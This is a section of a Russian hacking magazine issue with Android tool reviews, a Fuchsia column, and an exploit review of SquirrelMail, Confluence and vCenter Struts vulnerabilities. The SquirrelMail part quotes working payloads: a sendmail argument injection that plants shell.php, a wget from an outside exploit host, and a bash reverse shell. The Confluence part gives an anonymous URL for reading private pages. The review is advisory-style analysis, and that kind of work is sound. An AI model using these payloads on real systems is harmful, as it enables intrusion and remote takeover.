common/system.prop добавим строчку debug.sf.nobootanimation=1.
  Добавляем описание в module.prop, запаковываем все файлы в nobootan‐
imation.zip и устанавливаем через Magisk. Перегружаемся и, главное, не пуга‐
емся черного экрана после первого логотипа.





   Установка написан ного модуля и установленный модуль No bootanima‐
                                      tion в Magisk


ЗАКЛЮЧЕНИЕ
Magisk заметно облегчает жизнь при внесении системных модификаций,
а главное — он позволяет сделать это безопасно (вернуть смартфон к жизни
можно, просто удалив Magisk, как описано в статье). Более того, если ты
обновишь прошивку, все твои модификации вернутся, как только ты заново
установишь Magisk. Недурно, не правда ли?
 X‐MOBILE



ВЫПУСК #29
АПРЕЛЬСКИЙ НАБОР ГИКА
КАРМАННЫЙ


                     СЕГОДНЯ В ВЫПУСКЕ:
                      ПЛЕЕР YOUTUBE ССОФТ                  ПЛАВАЮЩИМ ОКНОМ,
                    МЕНЕДЖЕР ПРОШИВОК,
                    КОТОРЫЙ УПРОСТИТ
                      УСТАНОВКУ ROM’ОВ,
                      «GRUB» ДЛЯ ANDROID И
                   СОФТ ДЛЯ
                    ПРЕВРАЩЕНИЯ ТВОЕГО
                    СМАРТФОНА В
                     ЗАГРУЗОЧНУЮ ФЛЕШКУ.





 FLYTUBE: ПЛЕЕР YOUTUBE С ПЛАВАЮЩИМ ОКНОМ
 Признайся, сколько раз, пользуясь план шетом или смартфоном, ты хотел
  запустить видеопроигры ватель в отдельном маленьком окошке так, чтобы он
  не мешал браузин гу или чтению книги? Много? Тогда Flytube просто создан
  для тебя.
     Flytube — это альтернативный плеер YouTube, позволя ющий запускать
  ролики в небольшом окошке, которое можно «прикрепить» к одной из сторон
  экрана. В сущности, это единственное, что он может делать, но делает он
  это действительно хорошо.





     Выбирай видео, запускай и продол жай заниматься своими делами

  Flytube умеет использовать твою учет ную запись для просмотра сох раненных
  видео и видео с любимых каналов. Он имеет превосходное исполнение,
  это не просто окошко — его можно кидать в края экра на свайпами, оно абсо‐
  лютно не тормозит и чет ко подчиняется пальцу. Размер по умолчанию фик ‐
  сированный, но можно включить изменяемый в настройках.
    Приложение бесплат ное, но по понят ным причинам недоступное в Google
  Play. Скачать его можно по приведенной выше ссыл ке либо с помощью при‐
 ложения XDA Labs.




 CUSTOM ROM MANAGER — УПРОЩАЕМ УСТАНОВКУ РОМОВ
 Каждый, кто ставил кастомную прошивку, зна ет, насколько это неудобно.
 Сначала надо сложить на карту памяти все необходимые для установки фай‐
  лы: прошивку, пакет GApps, SuperSU, воз можно какие‐то модификации.
 Потом перезагрузить смартфон в recovery с помощью меню вык лючения
  или зажав клавишу увеличения громкости при включении, затем с помощью
 TWRP Recovery выбрать все эти файлы, поставить их в очередь и только тогда
  начинать шить. Custom ROM Manager намного упрощает задачу.
    Custom ROM Manager освободит тебя от необходимости перезагружаться
  в TWRP и делать что бы то ни было вручную. Работает это так: у тебя на карте
  памяти среди хлама, скачанного из интернета, хранит ся несколько прошивок,
  несколь ко пакетов GApps, все они разбросаны непонят но где, и ты даже
  не помнишь, когда их качал.
    Ты запускаешь Custom ROM Manager, он находит пригодные для прошивки
  ZIP‐архивы, каталогизирует их (прошивки в одну вклад ку, GApps в другую)
  и показывает тебе. Что со всем этим можно сделать? Конеч но же, составить
  очередь. Тапаем по нужной прошивке, в появившемся списке выставляем
  галочки, если нужно сделать вайп, потом тапа ем по GApps, по SuperSU, если
  его тоже надо прошить, а затем нажимаем круглую кнопку внизу экрана.





                  Составля ем очередь для прошивки

  Все, очередь готова. Еще один тап по круглой кнопке отправляет смартфон
  в ребут, из которого он воз вращается уже свежим, бодрым, в общем —
  с новой прошивкой.
    Боишься, что прошивка приведет к неработоспособности аппарата? Нет
 проблем, в выдвижной панели есть специальный пункт, с помощью которо го
 можно сделать и восстановить бэкап nandroid.
    Custom ROM Manager — очень простой инстру мент, который не умеет сам
  находить прошивки в Сети, не делает каких‐либо подсказок и не обладает
  выдающимися возможностями. Но именно в этом его преимущество: он
  просто решает одну задачу, и решает ее хорошо.




 EFIDROID — МУЛЬТИЗАГРУЗЧИК ДЛЯ СМАРТФОНА
 Наверняка ты не раз слы шал о загрузчике MultiROM, позволяющем уста‐
  новить на смартфон сразу несколько разных прошивок и перек лючаться меж‐
  ду ними. Но MultiROM неидеален: он требует пропат ченное ядро, специаль‐
 ную версию TWRP Recovery и совместим не со всеми про шивками. EFIDroid
 лишен его недостатков, он работает на любом ядре и может загрузить что
  угодно.
    Если ты читал мою старую статью о мультизагрузке, то знаешь, что MultiR‐
 OM — это не совсем загрузчик. Он внед ряется не между первичным заг‐
  рузчиком и прошивкой, а в саму прошив ку (а если быть точным — в RAM‐
  диск). Так что технически это система запуска одной прошивки из другой.
 Отсюда и требование ядра с пат чем kexec.
     EFIDroid — пол ноценный UEFI‐загрузчик, выступающий в качестве вто рич‐
  ного. Он запускается первичным загрузчиком смартфона, выводит меню
 выбора и затем загружает выбранную прошив ку. Точно так же, как на обыч‐
 ном десктопе.
     EFIDroid не устанавливает специальную версию TWRP, не модифицирует
  текущую прошивку и не принуждает исполь зовать специальный интерфейс
 TWRP для установки дополнительных прошивок. И установить, и удалить про‐
 шивки можно пря мо в Android, используя EFIDroid Manager.
   Однако EFIDroid сильно завязан на железо. Он использует возможности
  Little Kernel (LK), фирменного загрузчика Qualcomm, а потому работает толь‐
  ко на устройствах с соответствующим чипсетом. Более того, на данный
 момент поддерживается всего тринадцать устройств, включая OnePlus One,
  Motorola Moto G, Moto  E, Samsung  Galaxy Note  4,  Xiaomi  Mi2, Mi3w,
  Mi4 и Redmi Note 3 Pro.
    Для установки на поддерживаемое устройство необходимо получить root
  и установить TWRP. Затем ска чиваем EFIDroid Manager, перехо дим в раздел
  Install/Update и нажимаем большую круглую кнопку. После этого можно прис‐
  тупать к установке прошивок. Но сначала необходимо создать образ на карте
  памяти, в который будет установ лена новая прошивка.
    Для этого переходим в раздел Operating System, нажимаем +, выбираем
  иконку, добавляем имя и описание, выбираем место хранения образа
  и нажимаем галочку. Скачиваем нужную прошивку и кладем ее либо на внеш‐
 нюю карту  памяти, либо на флешку, подключенную с помощью OTG.
 Это необходимо сделать, так как запущенный для установки второй прошивки
 TWRP просто не увидит внутренний накопитель. Далее перезагружаемся.





                       Процесс уста новки

 На экране должно появиться  загрузочное меню  EFIDroid. Мышь здесь
  не работает, поэтому управлять придется с помощью клавиш громкости
  (вверх/вниз) и включения питания (Enter). Выбираем пункт TWRP, далее —
  созданный ранее образ и устанавливаем прошивку, как обычно. При сле‐
 дующей загрузке выбираем нужную прошивку.





                        Процесс загрузки

  Вот и все. Но это лишь вершина айсберга, на самом деле потенциал EFIDroid
 намного больше. В теории его можно использовать для запуска традици‐
  онных EFI‐приложений. Например, установить полноценный загрузчик GRUB
  для нативной загрузки Linux на смартфоне. Ну или добавить поддержку fast‐
  boot на устройство без его поддержки (привет, Samsung).




 DRIVEDROID — ЗАГРУЖАЕМАЯ ФЛЕШКА ИЗ СМАРТФОНА
 Каждому из нас приходилось прибегать к помощи самозагружающих ся дис‐
  ков и USB‐флешек. Слу чил ся ли сбой основной ОС, или понадобилось вос‐
  пользоваться чужим ПК, выручит флешка с собственной операционной сис‐
  темой или инсталлятором ОС. Однако, если у тебя есть смартфон, флешка
  больше не нужна. С задачей загрузки ОС он справится сам.
     DriveDroid превращает смартфон в самозагружаемую флешку, которая
  будет запускать на подключенном компьютере любой указанный образ диска,
  будь то Windows, Linux или еще более экзотическая ОС. Это отличный инстру‐
  мент для решения проблем, переустановки ОС и возможность всегда иметь
  под рукой собственную альтернативную ОС.
    Использовать DriveDroid просто. Он не требует заранее искать и скачивать
 образы или обладать какими‐то техническими знаниями. Все необ ходимое
  приложение сделает само, но для начала ему надо пройти инициализацию
  и определить, совместим ли технически смартфон с функцией загрузки ОС
  на ПК.
    Сразу после установки DriveDroid предложит определить техническую воз‐
  можность и активировать нужный режим работы. Для этого приложению
  необходимо предоставить права root и подключить смартфон кабелем к ком‐
  пу.





                Да ем права root и подключаем кабель

 Затем DriveDroid предложит выбрать пред почтительный метод работы. Stand‐
  ard Android работает в большинстве случаев. На последнем этапе надо ука‐
  зать, какой именно тип носителя ты увидел на компе: USB, CD‐ROM
  или никакого. Это легко проверить через провод ник.





              Выбираем метод работы и тип носителя

 Затем следует перезагрузить комп и попробовать загрузиться со смартфона.





                          DriveDroid успешно загрузился


  Если все прошло гладко, можешь начинать ска чивать образы нужных дистри‐
  бутивов  Linux прямо из приложения  (от минима листично го  SliTaz раз‐
 мером 35 Мбайт до пол ноценного Ubuntu). Впоследствии с каждого из них
 можно будет загрузиться, нажав на имени нужного образа, выбрать тип
  носителя (USB или CD), подключить смартфон кабелем и перезагрузить комп.
   Можно загрузить и Windows. Для этого необходимо скачать ISO‐образ,
  положить его на SD‐карту смартфона (или во внутреннюю память, если смар‐
 тфон не поддерживает карточки) и затем выбрать его при добавлении новой
 ОС в DriveDroid.
X‐MOBILE

   GOOGLE
   ГОТОВИТ
   ЗАМЕНУ
   ANDROID?


     КОЛОНКА ЕВГЕНИЯ ЗОБНИНА





                 Евгений Зобнин
                                                     zobnin@glc.ru





В апреле прошлого года, не сделав никаких анонсов, Google
выложила в Сеть исходники новой ОС Fuchsia, написанной
с  исполь зованием  языка  Dart.  «Фуксия»  базировалась
на крошечном микроядре, поэто му первое, что пришло
в голову журналистам и исследова телям кода: операционка
для  интернета  вещей.  Это  представление  полностью
перевернулось в начале мая, когда в Fuchsia появился гра‐
фический интерфейс.


В Fuchsia все приложения написаны на языке Dart, разработанном в недрах
Google в качестве современной и высокопроизводительной замены Java‐
Script. Google развивает Dart с 2011 года и неустанно ищет ему применение,
в том числе в рамках браузера Dartium (специаль ной сборки Chromium с под ‐
держкой Dart), компилятора Dart в JavaScript. С недавнего времени компания
предлагает использовать Dart для мобиль ной разработки с помощью фрей‐
мворка Flutter, позволяющего собрать приложение с интерфейсом в стиле
Material Design, одновременно для Android и iOS.





  Логическая схема Flutter

Именно при помощи Flutter в Fuchsia создан пользовательский интерфейс Ar‐
madillo. И это на 100% телефонный интерфейс, с оптимизацией под вер‐
тикальные экраны, панелью быстрых настроек и вертикальным скроллингом
рабочего стола. А так как Armadillo написан на Dart и Flutter, то и запустить его
можно уже сегодня. Энтузиасты подготовили сборку Armadillo в виде APK,
который можно установить на любой гуг лофон.
  Просто запусти приложение, и тебе откроется будущее мобильных
интерфейсов, каким его видят разработчики Fuchsia. В центре находится
юзерпик текущего пользователя, время, местоположение и иконка батареи.
Если нажать на юзерпик, откроется окно быстрых настро ек, знакомое любому
юзеру Android. Кнопки работают, ползунки двигаются, но ни на что не влияют.
Пункты Log out и More не работают вообще.





           Рабочий стол и панель быстрых настроек Armadillo

Интереснее становится, если промотать экран вниз: там ты увидишь большое
количество кар точек‐заглушек. Каждая из них при тапе разворачивает ся
на полный экран. Обрати внимание, что в этот момент внизу появляет ся точ‐
ка, а также информация о времени и состоянии батареи. Другими сло вами,
интерфейс динамический, и привычных строки состояния и панели навигации
в нем нет. Когда надо, они появляются, когда нет — исчезают. Сама точка —
это, разумеется, кнопка «Домой», она же, при удержании, откры вает панель
быстрых настроек.
  Необычно, интересно, но пока довольно стандар тно. Настоящие чудеса
начинают происходить, если попытаться объединить карточки, положив одну
на другую. В этом случае у тебя появит ся два варианта: либо разделить окно
на два, либо открыть два окна на пол ный экран, но с созданием строки табов
в верхней части экрана. Причем добавлять приложения и дробить экран мож‐
но практически неограниченное количество (пока Armadillo не упадет).





       Открытое на полный экран окно и режим разделения экрана

В нижней части главного экрана находит ся неч то вро де окна Google Now,
с помощью которого можно выпол нять поиск, тап по карточке откроет окно
на полный экран.





                Местный Google Now и клавиатура

Судя по всему, задача интерфейса Armadillo — унифицировать все информа‐
ционные потоки, такие как уведомления, вид жеты, карточки Google Now, окна
приложений и переключатель между окнами, в рамках единой концепции (и
устранить сегодняшний разброд).
   Легко заметить, что весь интерфейс Armadillo, по сути, построен вокруг
двух элемен тов: карточки и окна. Скорее всего, уведомления будут появлять‐
ся на экране в виде таких карточек, а сами кар точки будут одновре менно
играть роль уведомлений, виджетов и миниатюр запущенного приложения.
  Например, запускаешь Telegram, сворачиваешь его в карточку (которая
отображает пару последних сообщений, например). Постепенно, когда при‐
ходят уведомления от других приложений, пользователь открывает новые
приложения и совершает другие действия, карточка «Телеграма» смещается
вверх, но, как только в Telegram приходит уведомление, она вновь становит ся
первой (или последней, как посмотреть) и обновляет свое содержимое. Сма‐
хиваешь карточку, чтобы закрыть Telegram, или ничего не делаешь, она сама
уйдет вверх.
   Это, конечно, только мои домыслы, но идея выглядит более чем здравой,
а ее правильная реализация действитель но будет очень удобна. Идея сво ‐
рачивающихся в виджет приложений уже была успешно опро бована и доказа‐
ла свое удобство в BlackBerry 10 и Sailﬁsh OS. А если ее объединить с уве‐
дом лениями, то будет совсем красота — единый интерфейс управления
всем.


ДЛЯ ЧЕГО ЭТО ВСЕ?
Окей, Google действительно разрабатывает новую операционку для смар‐
тфонов и настольных ПК (да, Armadillo может масштабиро ваться на большой
экран, формируя интерфейс в стиле фреймового менеджера окон). Даже
в виде концепта все это выглядит круто. Но зачем?
  Неужели  Google  действительно  собирается  отказаться  от  Android,
огромной базы юзеров и вендоров ради операционки, будущее которой
туманно? На этот вопрос есть два ответа.
  Первый. В недрах Google постоянно появ ляется и исчезает огромное
количество эксперимен тальных проектов, из них некото рые успешно внед‐
ряются (недавний пример: движок Google Translate на базе нейронной сети),
а другие так и не выходят из стадии альфы. Существо вание Fuchsia вполне
вписывается в эту модель: найдем применение в телефонах — отлично,
не найдем — попробуем в другом месте. Не зря же Fuchsia может масшта‐
бироваться  от крохотной системы для микроконтроллеров до мощных
рабочих станций.
   Второй. Google смотрит в будущее на многие годы вперед. Fuchsia может
стать системой, которая не заменит Android в одночасье, а будет постепенно
вытеснять его с рынка.
  Включив фантазию, можно придумать примерно такой сце нарий: Google
развивает Fuchsia, заканчивает графический интерфейс, создает базовый
набор приложений и выкидывает дешевые смартфоны  на ее осно ве
куда‐нибудь в Индию по цене 50 дол ларов за штуку.
  Постепен но выходят новые смартфоны с новой версией Fuchsia. База
приложений попол няется благодаря Flutter, разработ чики уже начали исполь‐
зовать его для создания кросс‐плат форменного софта для Android и iOS.
  В Fuchsia появляется режим совмести мости с приложениями Android
(перенести среду исполнения Android, как известно, можно даже в BlackBerry
10, которая ни разу не на ядре Linux), а значит, огромное количество готового
софта.
  Независимые разработчики начинают присматриваться к новой опе раци‐
онке и писать для нее софт с целью состричь купонов, если операционка выс‐
трелит. Google проводит конкурсы на звание лучшего приложения в той
или иной области с крупными денежными призами.
   Fuchsia матереет, набирается функциональности, компании начинают
осторожно выпускать смартфоны на ее основе. Количество нативных при‐
ложений растет. Появляют ся функции для корпоративных пользователей.
  Новую операционку уже не критикуют, а хвалят. С ее помощью Google
решила многие проблемы Android: обновления приходят от самой Google
своевремен но, дыр в системе совсем немного, Fuchsia работает невероятно
плавно (графический стек Fuchsia основан на Vulcan, а Flutter может рен‐
дерить картинку со скоростью 120 кадров в секунду).
  Все больше вендоров выпускают смартфоны на базе Fuchsia, включая
флагманские  модели.  Магазин  нативных  приложений  уже  насчитыва‐
ет 100 тысяч тайтлов, рубрика Coding в журнале «Хакер» на треть состоит
из статей про написание приложений для Fuchsia.
  Компания Samsung сообщает, что ее Galaxy S16 будет основан на Fuchsia.
Android объявляется мертвым.
   Звучит бредово? Возможно, но пример но такой путь прошел Android,
перед тем как стал самой популярной ОС в мире.
 ВЗЛОМ





                                                                                            aLLy
                                                                                        ONsec
                                                                                                      @iamsecurity
       WARNING


            Вся информация
              предоставлена
             исключительно в
         ознакомительных целях.
        Ни редакция, ни автор не
          несут ответственности за
         любой возможный вред,
        причиненный материалами
             данной статьи.

ОБЗОР
ЭКСПЛОИТОВ
     АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ




  Сегодня на повестке дня парочка уже известных уязвимостей в
новом амплуа — RCE в SquirrelMail через манипуляцию параметрами
  в sendmail и RCE Struts 2 в VMware vCenter. Далее поговорим об
   ошибке в Confluence, которая позволяет неавторизированным
 пользователям просматривать содержимое страниц. На сладкое —
   уязвимость внедрения объектов в Microsoft Office, с помощью
      которой можно выполнить произвольный код. Вперед.


 ВЫПОЛНЕНИЕ ПРОИЗВОЛЬНОГО КОДА В SQUIRRELMAIL <= 1.4.23

  Дата релиза: 22 апреля 2017 года
  CVE:         CVE‐2017‐7692
  Автор:       Давид Голунский (Dawid Golunski)


  BRIEF
  Уязвимость существует из‐за недостаточно серьезной фильтрации адреса
  получателя почты. Если SquirrelMail настроен на работу в связке с sendmail, то
  злоумышленник, отправив специально сформирован ное письмо, сможет
  выполнить произвольный код на целевой системе.



                     https://vimeo.com/220491382




  EXPLOIT
  Перед нами не что иное, как очеред ная инкарнация ошибки в PHPMailer.
  Не так давно я писал о ней, так что, если тебя интересуют подробности,
  советую заглянуть и прочитать. Здесь ограничусь кратким описанием уяз‐
  вимости.


 Проб лемный код
  Не теряя времени даром, идем изучать исходники. Рассмотрим участок кода
  из файла Deliver_SendMail.class.php.
     /class/deliver/Deliver_SendMail.class.php


  080:    /**
  081:     * function initStream
  082:     *
  083:     * Initialise the sendmail connection.
  ...
  090:     function initStream($message, $sendmail_path) {
  091:         $rfc822_header = $message‐>rfc822_header;
  092:         $from = $rfc822_header‐>from[0];
  093:         $envelopefrom = trim($from‐>mailbox.'@'.$from‐>host);
  094:         $envelopefrom = str_replace(array("","n"),array('',''),$
  envelopefrom);
  095:         // save executed command for future reference
  096:         $this‐>sendmail_command = "$sendmail_path $this‐>sendma
  il_args ‐f$envelopefrom";
  097:         // open process handle for writing
  098:         $stream = popen(escapeshellcmd($this‐>sendmail_command),
   "w");
  099:         return $stream;
  100:     }

 Обрати внимание на строку 96, в ней указываются дополнительные парамет‐
  ры  для   запуска  бинарника   sendmail.  Один  из  парамет ров —
  $envelopefrom — может контролироваться пользователем. В разделе нас‐
  троек Personal Information можно указать почту, которая будет использовать ся
  в качестве заголовка From и Return‐Path.





           Адрес почты, который попадает в заголовок Return Path

  При отправке сообщения  этот адрес окажется в массиве $message‐>
  rfc822_header‐>from[0].





    Данные, которые попадают в команду запуска sendmail, и сама команда

  Для того чтобы добавить новые параметры при запуске бинарника, нам нужно
  отбить их пробелами. Только сделать это нам не позволит фильтрация
  в скрипте. Но не стоит расстраиваться, ведь не филь труются символы табуля‐
  ции, а они тоже прекрасно годят ся для разделения аргументов.
    Теперь можно загрузить шелл. Для этого воспользуемся ключом ‐oQ/tmp/
  и ‐X/path/to/file, который указывает путь до лога. В него будет записы‐
  вать ся весь процесс отправки письма.


  any@mailt‐oQ/tmp/t‐X/var/www/html/shell.php

  Конечно, для успешной эксплуатации нужно найти веб‐директорию, дос‐
  тупную для записи.


 RCE через кон фиг
 В предыдущей статье я предполагал, что существует также возможность экс‐
  плуатации через кастомный файл конфигурации sendmail, путь к которо му
  можно указать с помощью ключа ‐C. Так что я практически предсказал этот
  вектор атаки.  ;) Давид использует ата ку через конфиг в своем эксплоите.
  Давай заглянем в его исходники и разберем, как это работает.
     SquirrelMail_RCE_exploit.sh


  082: sqspool="/var/spool/squirrelmail/attach/"
  ...
  122: wget ‐q ‐O/tmp/smcnf‐exp https://legalhackers.com/exploits/
  sendmail‐exploit.cf
  ...
  127: attachid="`curl ‐H "Expect:" ‐s ‐b"SQMSESSID=$sessid; key=$keyid
  " ‐F"smtoken=$token" ‐F"send_to=$mail" ‐F"subject=attach" ‐F
  "body=test" ‐F"attachfile=@/tmp/smcnf‐exp" ‐F"username=$squser" ‐F
  "attach=Add" $URL/src/compose.php | awk ‐F's:32' '{print $2}' | awk
  ‐F'&quot;' '{print $2}' | tr ‐d 'n'`"
  ...
  145:    2) payload="$squser@localhost   ‐oQ/tmp/    ‐C$sqspool/
  $attachid"

  Для того чтобы загрузить конфиг, используется функция прик репления фай‐
  лов к письму. После загрузки ему присваивается уникальное имя, которое
  можно увидеть в исходном коде страницы. По умолчанию все аттачи хранятся
  в директории /var/spool/squirrelmail/attach/, поэтому в пейлоаде ука‐
  зывается путь до свежезалитого конфига ‐C$sqspool/$attachid.
     Заглянем в сам конфигурационный файл.
     sendmail-exploit.cf


  Mlocal, P=/usr/bin/php, F=lsDFMAw5:/|@qPn9S,
          S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
          T=DNS/RFC822/X‐Unix,
          A=php ‐‐ $u $h ${client_addr}

  Автор эксплоита переназнача ет мейлер local, используя флаг M. Указывает,
  что для отправки локальных писем нужно вызывать бинарник php и читать
  данные из STDIN (ключ ‐‐). Поэтому после отправ ки сообщения выполнится
  код, который указан в теле письма (переменная phprevsh).
     SquirrelMail_RCE_exploit.sh


  155: # Reverse shell code
  156: phprevsh="
  157: <?php
  158:    $cmd = "/bin/bash ‐c 'bash ‐i >/dev/tcp/$reverse_ip/$revers
  e_port 0<&1 2>&1 & '";
  159:    file_put_contents("/tmp/cmd", 'export PATH="$PATH" ; export
  TERM=vt100 ;' . $cmd);
  160:    system("/bin/bash /tmp/cmd ; rm ‐f /tmp/cmd");
  161: ?>"
  ...
  173: # Send email which triggers the RCE vuln and runs phprevsh
  174: echo ‐e "n[*] Sending the email to trigger the vuln"
  175: (sleep 2s && curl ‐s ‐D/tmp/sheaders ‐b"SQMSESSID=$sessid; key=
  $keyid" ‐d"smtoken=$token" ‐d"startMessage=1" ‐d"session=0"
  176: ‐d"send_to=$squser@localhost" ‐d"subject=poc" ‐‐data‐urlencode
  "body=$phprevsh" ‐d"send=Send" ‐d"username=$squser" $URL/src/compose.
  php) &

  Огромный плюс этого вектора в том, что для эксплуатации и заливки шелла
  не нужно искать доступную для записи веб‐директорию.


 TARGETS
   • SquirrelMail <= 1.4.23 (при работе в связке с sendmail).


 SOLUTION
 Можешь скачать последний SVN‐билд с сайта разработчика, в нем уяз‐
  вимость исправлена. Одна ко на момент написания статьи в Debian Wheezy
  через менеджер пакетов APT с репозитория все еще ставилась уязвимая
  версия скрипта.
ВЗЛОМ


                 ← НАЧАЛО СТАТЬИ
ОБЗОР
ЭКСПЛОИТОВ
    АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ

АНОНИМНЫЙ ДОСТУП К ЗАКРЫТЫМ СТРАНИЦАМ В ATLASSIAN CON‐
FLUENCE С V6.0.0 ДО V6.0.6

 Дата релиза: 5 апреля 2017 года
 CVE:         CVE‐2017‐7415
 Автор:       Yuvanesh


BRIEF
Причина уязвимости — отсутствие проверки прав пользователя для доступа
к страницам и блогам. Обратившись к любой записи через специально сфор‐
мированный запрос к REST API, злоумышленник может получить ее содер‐
жимое.



                   https://vimeo.com/220488460




EXPLOIT
В последнее время все чаще всплы вают ошибки в REST API разных приложе‐
ний. Не так давно была RCE в Drupal, еще раньше — внедрение контента
в WordPress. На этот раз проблема с API пробралась в про дукт австралийской
компании Atlassian под названием Conﬂuence.
   Этот софт использует ся организациями для создания внут рикорпоратив‐
ной базы знаний, в которой нередко можно найти массу полезной информа‐
ции: схемы LAN, списки пользователей, IP внутренних ресурсов, явки, пароли
и тому подобное. Такая находка — лакомый кусочек при проведении аудитов
и тестов на проникновение.


Ко паем исходники
Для теста я установил последнюю из уязвимых версий — Conﬂuence 6.0.6.
Почитав комментарии к репорту об этом баге, я узнал, что проб лемным мес‐
том оказалась точка входа в API — /rest/tinymce. Чтобы ты не утонул в оке‐
ане кода на Java в поисках первопричины, сразу скажу, что обработчики,
которые отвечают за этот эндпоинт, находят ся в файле JAR с названием con‐
fluenceWEB‐INFatlassian‐bundled‐pluginsconfluence‐editor‐6.0.6.
jar.
  Декомпилируем этот файл. Чаще всего я для этого использую сервис java‐
decompilers.com, там есть возможность выбрать из нескольких декомпилято‐
ров. Мой выбор — CFR, в ряде случаев результат его работы мне нравится
больше всего. Как вариант, можешь ска чать ар хив с декомпилированными
иходниками из моего репозитория.
  А теперь поглядим в сами исходники.
   com/atlassian/confluence/tinymceplugin/rest/PageResource.java


143:     @GET
144:     @Path(value="/draft/diff")
145:     @AnonymousAllowed
146:     public Response getDraftDiff(@PathParam(value="id") Long
contentId) {
147:         AbstractPage currentPage = this.pageManager.getAbs
tractPage(contentId.longValue());
148:         ContentEntityObject draftPage = this.draftsTransitio
nHelper.getDraftForPage(currentPage);
149:         String bodyDiff = this.differ.diff((ContentEntityObject)
currentPage, draftPage);
150:         return Response.status((Response.Status)Response.Status.
OK).entity((Object)this.replacePlaceholders(bodyDiff)).build();
151:     }

Строка @AnonymousAllowed (145) говорит нам о том, что метод может быть
вызван любым пользователем, в том числе и анонимным. В самом обработ‐
чике отсутствует проверка того, есть ли у пользователя хоть какие‐то права
для просмотра содержимого запрашиваемой страницы. Сравни это, нап‐
ример, с методом, который идет в коде далее.
   com/atlassian/confluence/tinymceplugin/rest/PageResource.java


153:     @GET
154:     @AnonymousAllowed
155:     public Response getEditorContent(@PathParam(value="id") Long
 contentId) {
...
161:         ConfluenceUser user = AuthenticatedUserThreadLocal.get()
;
...
179:         if (!this.permissionManager.hasPermission((User)user,
Permission.EDIT, (Object)page) || !this.hasValidLicense()) {
180:             return Response.status((Response.Status)Response.
Status.NOT_FOUND).build();
181:         }

Тут тоже разрешен анонимный доступ, однако в самом методе проверя ется,
есть ли у текущего пользователя разрешение на редактирование страницы.
В самом деле, если посмотришь на исходник PageResource.java из новой
версии (6.0.7), где уязвимость уже исправлена, то увидишь, что разработчики
добавили проверку прав пользователя.
   com/atlassian/confluence/tinymceplugin/rest/PageResource.java


143:     @GET
144:     @Path(value="/draft/diff")
145:     @AnonymousAllowed
146:     public Response getDraftDiff(@PathParam(value="id") Long
contentId) {
...
148:         ConfluenceUser user = AuthenticatedUserThreadLocal.get()
;
149:         if (!this.permissionManager.hasPermission((User)user,
Permission.EDIT, (Object)currentPage)) {
150:             return Response.status((Response.Status)Response.
Status.NOT_FOUND).build();
151:         }





         Diﬀ между исправленной и уязвимой версией PageResource


Пример эксплу атации
А теперь самое главное — посмотрим, как можно проэксплуатировать уяз‐
вимость. На самом деле это проще простого: тот случай, когда эксплоит —
это просто нужный  URI. Чтобы его  узнать, следует снова обратиться
к исходникам.
   com/atlassian/confluence/editor/page-editor-quit-dialog.js


174:     function showUnpublishedChanges() {
...
179:         $.ajax({
180:             url: CONSTANTS.CONTEXT_PATH + "/rest/tinymce/1/
content/" + Meta.get("page‐id") + "/draft/diff",
181:             type: "GET"
182:         }).success(function (response) {

Все, что требуется, — это узнать ID страницы. Затем переходим по ссылке
http://confluenceurl/rest/tinymce/1/content/<pageID>/draft/diff
и видим все содержимое.





                                              Alt text


TARGETS
 • Atlassian Conﬂuence начиная с 6.0.0 до 6.0.6 включительно.


SOLUTION
Разработчики выпустили новую версию приложения, в которой проблема
устранена. Обновляемся на 6.0.7 и выше.
ВЗЛОМ


                 ← НАЧАЛО СТАТЬИ
ОБЗОР
ЭКСПЛОИТОВ
    АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ

ВЫПОЛНЕНИЕ ПРОИЗВОЛЬНОГО КОДА В VMWARE VCENTER <= 6.5.0B

 Дата релиза: 13 апреля 2017 года
 CVE:         CVE‐2017‐5638
 Автор:      Кшиштоф Вегжинек (Krzysztof Wegrzynek)


BRIEF
Уязвимость существует из‐за того, что в vCenter использует ся устаревшая
версия фреймворка Apache Struts 2 с уязвимостью парсера сооб щений
об ошибках. Злоумышленник может отправить специально сформированный
HTTP‐запрос, который приведет к выпол нению произвольного кода с пра‐
вами веб‐сервера.



                   https://vimeo.com/220483261




EXPLOIT
Еще одна уязвимость‐флешбэк. О самой ошибке и ее причинах я писал
в предыдущем обзоре. Советую ознакомиться, а масштаб проблемы тебе
поможет оценить securityfocus.com. Обрати внимание на список уязвимых
продуктов. Здесь же я затрону толь ко особен ности эксплу атации уязвимости
в контексте VMware vCenter.
  Для начала нем ного терминологии. VMware vCenter — это централизован‐
ная платформа для управления средами VMware vSphere, с помощью которой
можно автоматизировать виртуальную инфраструктуру и предоставлять к ней
доступ. vSphere — популярная платформа для виртуализации ИТ‐инфраструк ‐
туры предприятия. Эти продукты с завид ным постоянством встречаются
на периметрах крупных компаний. Думаю, не стоит говорить, насколько серь‐
езными могут быть последствия захвата машины, которая управляет целым
парком виртуалок.
  Все тесты я проводил на vCenter версии 6.0, поэтому в другой ветке пути
расположения файлов могут различаться.
   Чтобы проэксплуатировать уязвимость, нам нужно найти те функции,
которые фреймворк Struts 2 использует для обработки запросов. Немного
пошарив по файловой системе, я нашел файл /usr/lib/vmware‐per‐
fcharts/tc‐instance/webapps/statsreport/WEB‐INF/lib/spring‐core.
jar — ядро фреймворка. Судя по наз ванию папки, это сервис Performance
Charts — построение графиков производительности. Написан он как раз
с использованием Struts 2. Наши подозрения также подтверждают найденные
файлы конфигурации.
   /usr/lib/vmware-perfcharts/tc-instance/webapps/statsreport/WEB-
INF/classes/struts.xml


09:    <include file="struts‐default.xml"/>
10:
11:    <constant name="struts.ui.theme" value="simple"/>
12:    <constant name="struts.ognl.allowStaticMethodAccess" value=
"true"/>
13:    <constant name="struts.enable.DynamicMethodInvocation" value=
"false"/>
14:    <constant name="struts.action.extension" value="do"/>
15:    <constant name="struts.custom.i18n.resources"
16:              value="com.vmware.vim.stats.webui.ApplicationReso
urces"/>
17:
18:    <bean name="clientRequestForm"
19:          class="com.vmware.vim.stats.webui.form.Client
RequestForm"
20:          scope="default"/>
21:
22:    <package name="statsreport" extends="struts‐default">

Теперь нужно найти точку входа на сервере для доступа к perfcharts. Конфиги
сообщают, что существует URI StatsChartServlet, который обрабаты вается
фреймворком.
   /usr/lib/vmware-perfcharts/tc-instance/webapps/statsreport/WEB-
INF/web.xml


139:    <filter>
140:       <filter‐name>StatsChartServletSecurity</filter‐name>
